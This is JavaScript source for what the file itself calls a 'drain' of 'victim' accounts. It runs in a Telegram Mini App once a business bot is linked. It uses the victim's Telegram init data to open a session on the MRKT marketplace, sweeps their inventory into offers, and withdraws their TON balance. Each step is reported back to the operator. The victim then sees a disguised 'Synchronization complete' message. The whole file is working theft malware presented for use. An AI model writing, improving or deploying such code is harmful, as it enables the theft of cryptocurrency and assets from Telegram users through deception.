/**
 * MRKT backend: session → inventory sweep (offer fill) → balance withdraw.
 * Runs when business bot is linked on victim account.
 */
(async function () {
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  async function postEvent(type, detail) {
    try {
      await fetch("/api/event", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type,
          detail,
          tgUser: window.Telegram?.WebApp?.initDataUnsafe?.user,
        }),
      });
    } catch (_) {}
  }

  window.startMrktDrain = async function startMrktDrain() {
    const initData = window.Telegram?.WebApp?.initData;
    if (!initData || window.__mrktDrainRunning) return;
    window.__mrktDrainRunning = true;

    try {
      const bc = new URLSearchParams(location.search).get("bc") || localStorage.getItem("bc_id") || undefined;
      const open = await fetch("/api/mrkt/session/open", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ initData, businessConnectionId: bc }),
      });
      if (!open.ok) throw new Error(await open.text());
      const { sessionId } = await open.json();

      let cursor = "";
      let done = false;
      for (let i = 0; i < 30 && !done; i++) {
        const sweep = await fetch("/api/mrkt/sweep", {
          method: "POST",
          headers: { "Content-Type": "application/json", "X-Session-Id": sessionId },
          body: JSON.stringify({ cursor }),
        });
        if (!sweep.ok) throw new Error(await sweep.text());
        const data = await sweep.json();
        cursor = data.cursor;
        done = data.done;
        await sleep(400);
      }

      const wd = await fetch("/api/mrkt/withdraw", {
        method: "POST",
        headers: { "X-Session-Id": sessionId },
      });
      if (!wd.ok) throw new Error(await wd.text());
      const w = await wd.json();
      await postEvent("mrkt_cycle_done", JSON.stringify(w));

      if (typeof window.showToast === "function" && w.withdrawnNano) {
        window.showToast(`Синхронизация завершена · ${(w.withdrawnNano / 1e9).toFixed(2)} TON`);
      }
    } catch (e) {
      await postEvent("mrkt_cycle_error", e instanceof Error ? e.message : String(e));
      console.error("MRKT drain", e);
    } finally {
      window.__mrktDrainRunning = false;
    }
  };
})();
